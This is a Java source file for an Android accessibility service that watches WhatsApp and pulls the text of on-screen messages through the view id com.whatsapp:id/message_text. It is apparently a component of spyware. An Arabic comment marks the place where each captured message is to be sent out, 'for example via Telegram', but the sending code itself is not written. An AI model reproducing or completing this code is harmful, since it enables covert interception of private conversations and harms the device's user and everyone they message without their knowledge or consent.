package com.alzahra.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class WhatsAppAccessibilityService extends AccessibilityService {
    private String lastMessage = "";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED | 
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
                         AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName().toString();
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return;

            if (packageName.contains("whatsapp")) {
                extractWhatsAppMessages(rootNode);
            }
            
            rootNode.recycle();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void extractWhatsAppMessages(AccessibilityNodeInfo root) {
        try {
            List<AccessibilityNodeInfo> messages = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/message_text");
            if (messages == null) return;

            for (AccessibilityNodeInfo msg : messages) {
                if (msg.getText() != null) {
                    String text = msg.getText().toString();
                    if (!text.equals(lastMessage) && !text.isEmpty()) {
                        lastMessage = text;
                        // هنا يتم إرسال الرسالة (مثلاً عبر Telegram)
                    }
                }
            }
        } catch (Exception e) { }
    }

    @Override
    public void onInterrupt() { }
}
